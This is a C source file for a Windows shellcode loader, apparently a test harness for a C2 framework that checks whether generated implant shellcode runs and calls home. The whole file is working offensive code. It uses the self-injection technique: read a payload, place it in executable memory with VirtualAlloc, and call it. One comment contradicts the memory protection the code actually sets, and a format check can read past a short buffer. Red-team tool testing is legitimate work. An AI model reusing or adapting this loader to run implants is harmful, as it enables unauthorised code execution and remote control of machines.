/*
 * A minimal shellcode loader for verifying that c2tool's shellcode output
 * actually executes and calls home.
 *
 * Why this exists: the route sweep and the payload test both proved that
 * EXECUTABLES work, but shellcode is a different artifact -- it is raw position
 * -independent code with no loader of its own, so "it built" says nothing about
 * whether it runs. Verifying it needs a program whose only job is to hand the
 * bytes to the CPU.
 *
 * The technique is the classic self-injection: allocate memory, mark it
 * executable, copy the payload in, and call it. It is deliberately written to
 * make the failure modes distinguishable rather than to be stealthy:
 *
 *   - a payload that is not real shellcode crashes rather than running
 *     silently, and the exit code records where
 *   - every step reports what it did, so a run that produces no callback
 *     still says whether the bytes were ever executed
 *
 * ASCII only.
 *
 * Build (MSYS2/MinGW gcc):
 *   gcc -O0 -o loader.exe loader.c
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* Reads a whole file into a heap buffer. Returns NULL and sets *len to 0 on
 * failure, so the caller has one thing to check. */
static unsigned char *read_file(const char *path, size_t *len) {
    FILE *f = fopen(path, "rb");
    if (!f) {
        printf("[!] cannot open %s (errno %d)\n", path, errno);
        return NULL;
    }
    if (fseek(f, 0, SEEK_END) != 0) {
        printf("[!] cannot seek %s\n", path);
        fclose(f);
        return NULL;
    }
    long size = ftell(f);
    if (size <= 0) {
        printf("[!] %s is empty or size unknown (%ld)\n", path, size);
        fclose(f);
        return NULL;
    }
    rewind(f);
    unsigned char *buf = (unsigned char *)malloc((size_t)size);
    if (!buf) {
        printf("[!] out of memory for %ld bytes\n", size);
        fclose(f);
        return NULL;
    }
    size_t got = fread(buf, 1, (size_t)size, f);
    fclose(f);
    if (got != (size_t)size) {
        printf("[!] short read: %zu of %ld\n", got, size);
        free(buf);
        return NULL;
    }
    *len = got;
    return buf;
}

/* Recognises the container formats c2tool can emit, so a mismatch is reported
 * as one instead of as a crash. Returns a borrowed description string. */
static const char *describe_payload(const unsigned char *d, size_t n) {
    if (n >= 2 && d[0] == 'M' && d[1] == 'Z') {
        return "PE (MZ) -- this is an executable, not shellcode";
    }
    if (n >= 4 && d[0] == 0x7f && d[1] == 'E' && d[2] == 'L' && d[3] == 'F') {
        return "ELF -- this is a Linux executable, not shellcode";
    }
    if (n >= 4) {
        unsigned int off = (unsigned int)d[0x3c] | ((unsigned int)d[0x3d] << 8) |
                           ((unsigned int)d[0x3e] << 16) | ((unsigned int)d[0x3f] << 24);
        if (off && off + 4 <= n && d[off] == 'P' && d[off + 1] == 'E') {
            return "PE with a shifted header -- not shellcode";
        }
    }
    return "raw bytes -- treating as shellcode";
}

int main(int argc, char **argv) {
    if (argc < 2) {
        printf("usage: %s <shellcode.bin> [--no-exec]\n", argv[0]);
        printf("  --no-exec  load and map the payload but do not run it\n");
        return 2;
    }
    const char *path = argv[1];
    int execute = 1;
    if (argc >= 3 && strcmp(argv[2], "--no-exec") == 0) {
        execute = 0;
    }

    printf("[*] loader pid %lu\n", (unsigned long)GetCurrentProcessId());

    size_t len = 0;
    unsigned char *payload = read_file(path, &len);
    if (!payload) {
        return 3;
    }
    printf("[*] loaded %zu bytes from %s\n", len, path);
    printf("[*] %s\n", describe_payload(payload, len));

    /* The guard below is what makes a wrong-format file obvious: a PE or ELF
     * handed to a shellcode loader is a test mistake, and reporting it is
     * cheaper than debugging a crash. It is not a security control. */
    if (len >= 2 && payload[0] == 'M' && payload[1] == 'Z') {
        printf("[!] refusing to execute: this is a PE, not shellcode\n");
        free(payload);
        return 4;
    }

    /* VirtualAlloc rather than malloc: the region must be free to mark
     * PAGE_EXECUTE_READ, and malloc'd memory may sit in a page shared with
     * something else. */
    LPVOID mem = VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE,
                             PAGE_EXECUTE_READWRITE);
    if (!mem) {
        printf("[!] VirtualAlloc(%zu) failed: %lu\n", len, GetLastError());
        free(payload);
        return 5;
    }
    memcpy(mem, payload, len);
    printf("[*] copied to %p\n", mem);

    if (!FlushInstructionCache(GetCurrentProcess(), mem, len)) {
        printf("[!] FlushInstructionCache failed: %lu (continuing)\n", GetLastError());
    }

    if (!execute) {
        printf("[*] --no-exec set; mapped but not running\n");
        VirtualFree(mem, 0, MEM_RELEASE);
        free(payload);
        return 0;
    }

    printf("[*] calling the payload now\n");
    fflush(stdout);

    /* The cast through a function pointer is the whole point of the program.
     * The payload is expected never to return: an implant that calls home keeps
     * running. If it does return, that is itself informative -- it means the
     * bytes ran and finished, which is not what a session-producing payload
     * should do. */
    typedef void (*entry_t)(void);
    entry_t entry = (entry_t)mem;
    entry();

    printf("[*] the payload returned (it normally should not)\n");
    VirtualFree(mem, 0, MEM_RELEASE);
    free(payload);
    return 0;
}
